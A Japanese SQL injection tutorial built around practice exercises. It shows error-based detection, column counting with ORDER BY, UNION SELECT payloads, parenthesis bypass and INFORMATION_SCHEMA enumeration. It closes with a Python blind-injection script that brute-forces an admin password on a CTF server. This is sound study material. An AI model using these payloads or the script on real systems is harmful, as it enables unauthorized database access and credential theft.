# SQLインジェクション

## インジェクションの可否の判定

例えば、sql1-1の場合、`'`と入力した場合に、以下のように`'''`という構文エラーが発生します。

```
SELECT id, username, password FROM users WHERE username='''
```

このように、様々な入力を与え、それに対する挙動からインジェクションが可能かどうかを判断できます。

### sqli1-2
`'`で検索しても、エラーが表示されません。
そこで、Chromeで`右クリック->検証`から開発者ツール(デベロッパーツール)を開きます。
`Network`タブへ移動し、ページを更新すると、HTTPのレスポンスがみれます。

`Headers`タブのステータスコードを見ると
`500 Internal Server Error`となっています。

これだけでは、SQLのシンタックスエラーかどうかはわからないので、今度は
`''`で検索してみます。

今度は`200 OK`になりました。  
これで、SQLインジェクションが可能である可能性がかなり高いことがわかります。

### エラーハンドリングがされている場合

php内部で、try-catch構文を用いてerrorが発生してもプログラムが止まらないようにされている場合、
ステータスコードは常に`200 OK`となります。

このような場合でも、SQLインジェクションの可否を判定できます。（チャレンジブックp221~参照）

## 攻撃手法 ~UNION句~

UNION句で繋げるためには条件が二つあります。


- 繋げるデータの型が同じ
- 繋げるデータのカラム数が同じ

データの型とは、INT型とかVARCHAR型とかです。
つまり、user_name(VARCHAR)とuser_id(INT)を繋げることはできません。

また、user_nameとpost_titleの二つに対し、3つ以上のカラムを連結することはできません。
そのため、元々のSELECT文がいくつのカラムを取得しているかを推定する必要があります。

推定する手法の一つに、`ORDER BY`句を用いる手法があります。
`ORDER BY 3`のように `BY`の後ろにカラム名ではなく整数nを与えると、n番目のカラムで並び替えをしてくれます。  
よって、nの値を色々試すことで、カラム数を特定できます。

### sqli2-1

まず、`'`と入力してみましょう。
エラー文から、SQLインジェクションができそうだとわかります。

次に、`'order by 1 -- `と入力してみましょう。

エラー文が消えたことから、SQLインジェクションができることがほぼ確定しました。

```
'order by 10 -- 
```

```
'order by 5 --
```

といった入力では、エラーになります。このため、カラム数は4以下であることがわかりました。

```
'oreder by 3 -- 
```
ではエラーが消えるため、カラム数は3か4です。


```
'order by 4 -- 
```

最後に4で試すと、エラーが出るため、今回の例ではカラム数が3であることが分かりました。

1,2,3という数値を連結してみましょう。

```
' union select 1,2,3 -- 
```

## 括弧の有無

いつもサーバ側で下のようなSELECT文になっているとは限りません。

```
SELECT id, username, password FROM users WHERE username='{$search}'
```

例えば、以下のようにwhere句が括弧で囲まれていたりします。

```
SELECT id, username, password FROM users WHERE (username='{$search}')
```

このような場合も、括弧を閉じてあげればSQLインジェクションが可能です。

### sqli2-2

まず、`'`と入力してみましょう。
エラーが出るので、SQLインジェクションできそうです。

次に、`or 1=1 -- `と入力してみましょう。  
これまでと同じであれば、全てのユーザの情報が取得できるはずです。

しかし、エラーが出てしまいます。
この場合、SELECT文の書き方が想定と異なると仮説をたて、括弧の存在を疑います。

```
') or 1 = 1 -- 
```

これで、成功できました。
先ほどのようにUNION句で1,2,3を繋げてみましょう。

```
') union select 1,2,3 -- 
```


## 攻撃対象の探し方

UNION句で欲しい情報を取得できるようになったので、
欲しい情報がどんなテーブルの、どんなカラムにあるかを調べる必要があります。

これは、それが載っているデータベースがあるので、そこを参照すれば良いです。

例えば、mysqlでは`INFORMATION_SCHEMA`というデータベースの
`TABLES`というテーブルにテーブル情報が、`COLUMUNS`というテーブルにカラムの情報が載っています。

postgresqlでも同様のデータベースがあり、sqliteでは`SQLITE_MASTER`というテーブルの`sql`というカラム名で取得できます。

### sqli3-1

UNION句が成功するというところまで判別済みとします。

```
' union select 1,2,3 -- 
```

ここで、まずはデータベースに`INFORMATION_SCHEMA`というデータベースに`TABLES`や`COLUMNS`があるかどうかを調べます。

```
' union select 1,2,3 from INFORMATION_SCHEMA.TABLES -- 
```

```
' union select 1,2,3 from INFORMATION_SCHEMA.COLUMNS -- 
```

同じ結果が得られるので、存在が確認できました。
もし存在しなければ、 そんなテーブル無いぞ、とエラーが出るはずです。

ここまでくれば勝ったようなもので、`INFORMATION_SCHEMA.COLUMNS`に対して、`table_name`と`column_name`を取ってくれば良いだけです。

```
' union select table_name, column_name, 3 from INFORMATION_SCHEMA.COLUMNS -- 
```



## ブラインドSQL

```
admin' AND substr((SELECT pass FROM user WHERE id='admin'),1,1) = 'F'; --
```

```python
import requests

def httpRequest(id, pw):
    url = 'http://ctfq.sweetduet.info:10080/~q6/'
    req = {'id':id, 'pass': pw}
    res = requests.post(url,data=req)
    return res.text

def atkpw(plen):

	flag = ''

	for p in range(0, plen):
		for i in range(48, 123):
			char = chr(i)
			id = "admin' AND substr((SELECT pass FROM user WHERE id='admin'), " + str(p + 1) + ", 1) = " + "'" + char + "'" + " ; --"
			pw = "''"

			data = httpRequest(id, pw)

			if len(data) > 2000:
				print(str(i) + ": " + char)
				flag = flag + char
				print(flag)
				break

	return flag
if __name__ == '__main__':
    plen = 21
    print(atkpw(plen))

```

